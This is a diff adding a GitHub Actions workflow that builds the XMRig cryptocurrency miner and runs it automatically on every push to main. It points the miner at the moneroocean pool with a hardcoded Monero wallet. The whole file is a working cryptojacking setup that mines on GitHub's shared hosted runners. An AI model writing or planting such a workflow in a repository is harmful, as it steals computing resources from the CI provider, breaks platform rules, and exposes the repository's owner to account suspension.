@@ -1,0 +1,35 @@
+name: Run XMRig Miner
+
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+
+jobs:
+  run-xmrig:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+
+      - name: Install Dependencies
+        run: |
+          sudo apt update -y
+          sudo apt upgrade -y
+          sudo apt install -y openssl git cmake make curl libuv1-dev
+
+      - name: Clone and Build XMRig
+        run: |
+          git clone https://github.com/xmrig/xmrig.git
+          cd xmrig
+          mkdir build
+          cd build
+          cmake .. -DWITH_HWLOC=OFF
+          make
+
+      - name: Run XMRig
+        run: |
+          cd xmrig/build
+          ./xmrig -o gulf.moneroocean.stream:10128 -u 4576JTdTYFp6hi2n2Ci54eSFzV8GSkNJTJVC1zswJpk7byZMSfu4W4mVpCsoQJHfSyQS6y5CkZ1kbZTTbUBbpFrYRgtzsrG -p HHc7N
